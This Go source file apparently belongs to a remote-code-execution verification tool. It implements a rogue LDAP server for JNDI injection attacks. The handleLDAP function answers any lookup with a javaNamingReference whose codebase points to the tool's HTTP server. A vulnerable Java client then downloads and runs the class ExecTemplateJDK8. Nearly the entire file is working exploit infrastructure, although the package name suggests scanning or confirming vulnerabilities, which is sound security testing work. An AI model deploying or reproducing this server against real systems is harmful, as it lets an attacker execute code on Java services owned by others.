package rceverify

import (
	"log"
	"net"
	"strings"
	"time"
)

// Minimal LDAPv3 server that responds to a baseObject search request
// with a javaReference pointing to our HTTP class URL.
//
// LDAP wire format (BER-encoded):
//   SearchRequest:
//     [APPLICATION 0] { baseObject, scope, derefAliases, sizeLimit, timeLimit, typesOnly, filter, attributes }
//   SearchResultEntry:
//     [APPLICATION 4] { objectName, attributes [SEQ OF [SEQ OF type, vals SET]] }
//   SearchResultDone:
//     [APPLICATION 5] { resultCode, matchedDN, diagnosticMessage }
//
// We don't fully parse the request — we just read the message id and echo back
// a reference entry.

func (s *Server) serveLDAP() {
	for {
		conn, err := s.ldapLis.Accept()
		if err != nil {
			select {
			case <-s.stopCh:
				return
			default:
				log.Printf("[ldap] accept: %v", err)
				continue
			}
		}
		go s.handleLDAP(conn)
	}
}

func berLen(n int) []byte {
	if n < 0x80 {
		return []byte{byte(n)}
	}
	if n < 0x100 {
		return []byte{0x81, byte(n)}
	}
	return []byte{0x82, byte(n >> 8), byte(n)}
}

func berOctetString(tag byte, data string) []byte {
	out := []byte{tag}
	out = append(out, berLen(len(data))...)
	return append(out, []byte(data)...)
}

func berSequence(inner ...[]byte) []byte {
	total := 0
	for _, b := range inner {
		total += len(b)
	}
	out := []byte{0x30}
	out = append(out, berLen(total)...)
	for _, b := range inner {
		out = append(out, b...)
	}
	return out
}

func berEnum(v int) []byte {
	return []byte{0x0a, 0x01, byte(v)}
}

func berInteger(v int) []byte {
	return []byte{0x02, 0x01, byte(v)}
}

// ldapMsgID extracts the messageID from an LDAPMessage:
// 0x30 len 0x02 len id ...
func ldapMsgID(b []byte) int {
	if len(b) < 6 || b[0] != 0x30 || b[2] != 0x02 {
		return 1
	}
	return int(b[4])
}

// ldapAttr builds a PartialAttribute: sequence { type, SET OF values }
func ldapAttr(name string, values ...string) []byte {
	set := []byte{0x31, 0x00}
	var inner [][]byte
	for _, v := range values {
		inner = append(inner, berOctetString(0x04, v))
	}
	set = berSequence(inner...)
	set[0] = 0x31
	return berSequence(berOctetString(0x04, name), set)
}

// ldapMessage wraps a protocolOp in an LDAPMessage:
// SEQUENCE { messageID INTEGER, protocolOp [APPLICATION tag] }
func ldapMessage(id int, opTag byte, opInner ...[]byte) []byte {
	op := berSequence(opInner...)
	op[0] = opTag
	return berSequence(berInteger(id), op)
}

// handleLDAP serves the anonymous bind followed by the base-object search
// and answers with a javaNamingReference that makes the JNDI client load
// ExecTemplateJDK8 from our HTTP server.
func (s *Server) handleLDAP(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	buf := make([]byte, 8192)

	// --- BindRequest ---
	n, err := conn.Read(buf)
	if err != nil {
		return
	}
	bindID := ldapMsgID(buf[:n])
	log.Printf("[ldap] conn from %s bind msgID=%d (%d bytes)", conn.RemoteAddr(), bindID, n)

	bindResp := ldapMessage(bindID, 0x61, berEnum(0), berOctetString(0x04, ""), berOctetString(0x04, ""))
	if _, err := conn.Write(bindResp); err != nil {
		log.Printf("[ldap] bind write: %v", err)
		return
	}

	// --- SearchRequest ---
	n, err = conn.Read(buf)
	if err != nil {
		log.Printf("[ldap] search read: %v", err)
		return
	}
	searchID := ldapMsgID(buf[:n])
	log.Printf("[ldap] search msgID=%d (%d bytes)", searchID, n)

	attrs := berSequence(
		ldapAttr("objectClass", "javaNamingReference"),
		ldapAttr("javaClassName", "ExecTemplateJDK8"),
		ldapAttr("javaFactory", "ExecTemplateJDK8"),
		ldapAttr("javaCodeBase", strings.TrimSuffix(s.httpClassURL(), "ExecTemplateJDK8.class")),
	)
	entry := ldapMessage(searchID, 0x64, berOctetString(0x04, s.LDAPPath), attrs)
	if _, err := conn.Write(entry); err != nil {
		return
	}

	done := ldapMessage(searchID, 0x65, berEnum(0), berOctetString(0x04, ""), berOctetString(0x04, ""))
	conn.Write(done)

	log.Printf("[ldap] sent javaNamingReference ExecTemplateJDK8 → %s", s.httpClassURL())
}
